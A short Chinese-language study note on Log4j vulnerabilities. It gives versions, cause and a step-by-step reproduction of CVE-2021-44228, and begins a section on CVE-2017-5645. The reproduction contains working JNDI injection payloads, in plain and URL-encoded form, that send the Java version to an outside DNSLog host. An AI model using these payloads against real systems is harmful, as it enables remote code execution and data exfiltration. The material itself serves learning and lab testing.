log4j是基于Java的日志记录框架

### Log4j2-远程命令执行（CVE-2021-44228）

##### 版本

2.0 ≤ Apache Log4j2 < 2.15.0-rc2

##### 原理

log4j提供lookup查询服务，里面有{}字段解析功能【JNDI解析】，当${。。。。。。}里面的字段出现.class文件时，log4j2会执行里面的代码，因此可以通过JNDI协议实现注入

##### 利用

[log4j2 远程代码执行漏洞复现（CVE-2021-44228）_log4j命令执行流量特征-CSDN博客](https://blog.csdn.net/Myon5/article/details/136548391)

以获取java版本为例

1.使用 DNSLog 平台获取一个子域名

![img](https://i-blog.csdnimg.cn/blog_migrate/60edac27d960a01a86eb02106ac49184.png)

2.构造payload:

```
 http://127.0.0.1:9001/hello?payload=${jndi:ldap://7fprj5.dnslog.cn}
```

3.添加获取java版本的命令

```
http://127.0.0.1:9001/hello?payload=${jndi:ldap://${sys:java.version}.7fprj5.dnslog.cn}
```

4.进行url编码

```
http://127.0.0.1:9001/hello?payload=%24%7Bjndi%3Aldap%3A%2F%2F%24%7Bsys%3Ajava.version%7D.7fprj5.dnslog.cn%7D
```

5.把该payload放到网站的url处并访问，之后查看DNSLOG平台即可获取信息

![img](https://i-blog.csdnimg.cn/blog_migrate/34cde3cd085fa9cdd02059fba7d0636d.png)

------

省时省力就用工具

### log4j-[反序列化]命令执行漏洞(CVE-2017-5645)

##### 版本

 Apache Log4j 2.8.2之前的2.x版本

##### 原理

该漏洞主要是由于在处理ObjectInputStream时，接收函数对于不可靠来源的input没有过滤